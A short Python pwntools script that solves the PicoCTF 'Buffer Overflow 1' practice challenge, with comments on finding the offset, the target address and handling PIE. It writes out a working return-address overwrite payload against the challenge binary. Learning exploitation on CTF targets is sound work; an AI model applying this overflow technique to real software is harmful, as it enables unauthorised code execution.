import sys
from pwn import p32

# 1. checksec and confirm no canary, check PIE (need leaked address if PIE enabled)
# 2. find offset: cyclic(N) from pwntools, send it, cyclic_find(leaked_bytes) on whats returned
# 3. find target address: objdump -d ./binary | grep <function>
# 4. if PIE enabled: target = leaked_addr - fixed_offset (fixed_offset found via objdump on both functions)

offset = 44
target_addr = 0x080491f6

payload = b'A' * offset + p32(target_addr, endian='little')
sys.stdout.buffer.write(payload)

# PicoCTF Buffer Overflow 1: https://play.picoctf.org/practice/challenge/255?category=1&page=1&solved=0